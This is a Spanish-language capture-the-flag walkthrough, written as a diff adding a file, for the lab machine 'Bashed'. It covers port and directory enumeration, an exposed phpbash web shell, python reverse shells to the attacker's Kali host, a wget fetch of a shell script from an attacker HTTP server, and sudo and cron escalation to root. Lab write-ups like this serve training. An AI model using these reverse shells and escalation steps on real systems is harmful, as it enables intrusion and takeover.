@@ -1,0 +1,127 @@
+
+    1️⃣ Enumerar los puertos usando NMAP
+    
+        sudo nmap -sVC <IP máquina víctima> -Pn
+
+            PORT     STATE SERVICE    VERSION
+            80/tcp   open  http       Apache httpd 2.4.18 ((Ubuntu))
+            |_http-title: Arrexel's Development Site
+            |_http-server-header: Apache/2.4.18 (Ubuntu)
+            1234/tcp open  tcpwrapped
+
+    2️⃣ Abrir en el navegador la siguiente URL: 
+
+        http://<IP máquina víctima>
+    
+    3️⃣ Descubrir directorios interesantes
+
+        gobuster dir -u http://<IP máquina víctima> -w /usr/share/wordlists/dirb/common.txt
+
+            .htaccess            (Status: 403) [Size: 297]
+            .hta                 (Status: 403) [Size: 292]
+            .htpasswd            (Status: 403) [Size: 297]
+            css                  (Status: 301) [Size: 312] [--> http://<IP máquina víctima>/css/]
+            dev                  (Status: 301) [Size: 312] [--> http://<IP máquina víctima>/dev/]
+            fonts                (Status: 301) [Size: 314] [--> http://<IP máquina víctima>/fonts/]
+            images               (Status: 301) [Size: 315] [--> http://<IP máquina víctima>/images/]
+            index.html           (Status: 200) [Size: 7743]
+            js                   (Status: 301) [Size: 311] [--> http://<IP máquina víctima>/js/]
+            php                  (Status: 301) [Size: 312] [--> http://<IP máquina víctima>/php/]
+            server-status        (Status: 403) [Size: 301]
+            uploads              (Status: 301) [Size: 316] [--> http://<IP máquina víctima>/uploads/]
+    
+    4️⃣ Ir navegando por los distintos directorios descubiertos con gobuster
+
+        En el directorio /dev se encuentra el script phpbash.php que se muestra en el inicio de la página. Se ejecuta para obtener una terminal. 
+
+            http://<IP máquina víctima>/dev/phpbash.php
+
+    5️⃣ Hacer una reverse shell para estabilizar la conexión
+
+        En una terminal en Kali (en el mismo directorio), se ejecuta un listener, donde se recibirá la conexión
+
+            nc -lvnp 1234
+
+        En la sesión obtenida en el navegador (www-data), se introduce el siguiente script:
+
+            python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP local Kali>",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
+
+    6️⃣ Obtener la user flag
+
+        /home/arrexel/user.txt 
+     
+    7️⃣ Enumerar los privilegios que tiene el usuario actual e identificar vectores de escalada de privilegios hacia root
+    
+        sudo -l
+    
+            Matching Defaults entries for www-data on bashed:
+            env_reset, mail_badpass,
+            secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+            User www-data may run the following commands on bashed:
+            (scriptmanager : scriptmanager) NOPASSWD: ALL
+    
+    8️⃣ Se puede ejecutar comandos como el usuario scriptmanager sin conocer su contraseña
+
+        sudo -u scriptmanager bash -i
+
+    9️⃣ Se busca la ruta /script perteneciente al usuario scriptmanager, donde hay dos archivos: 
+
+        test.txt
+        test.py
+
+    1️⃣0️⃣ Se abre el script test.py 
+
+        cat test.py
+        f = open("test.txt", "w")
+        f.write("testing 123!")
+        f.close()
+
+        Que realiza lo siguiente: 
+
+            1. Abre (o crea si no existe) un archivo llamado test.txt en modo escritura ("w"), en el mismo directorio donde se ejecuta.
+            2. Escribe el texto testing 123! dentro de ese archivo.
+            3. Cierra el archivo con f.close() al terminar el proceso.
+
+    1️⃣1️⃣ Preparar una listener en Kali (en otra terminal, fuera de la sesión actual)
+
+        nc -lvnp 4445
+
+    1️⃣2️⃣ Crear un script en el directorio actual
+
+        cat > shell.py << 'EOF'
+        import socket,subprocess,os
+        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+        s.connect(("<IP local Kali>",4445))
+        os.dup2(s.fileno(),0)
+        os.dup2(s.fileno(),1)
+        os.dup2(s.fileno(),2)
+        import pty
+        pty.spawn("bash")
+        EOF
+
+        Comprobar que se ha creado correctamente
+
+            cat shell.py
+
+    1️⃣3️⃣ Subir el fichero 
+
+        Ejecutar el listener en Kali para subir el fichero 
+
+            python3 -m http.server 8000
+
+        Ejecutar el comando en la máquina víctima para subir el fichero 
+
+            wget http://<IP local Kali>:8000/shell.py
+
+    1️⃣4️⃣ Esperar un minuto hasta que se ejecute y revisar el listener que se ha creado 
+
+    1️⃣5️⃣ Comprobar que se ha creado la sesión root en la terminal donde estaba el listener: 
+
+        id 
+
+            uid=0(root) gid=0(root) groups=0(root)
+
+    1️⃣6️⃣ Obtener la root flag
+
+        /root/root.txt
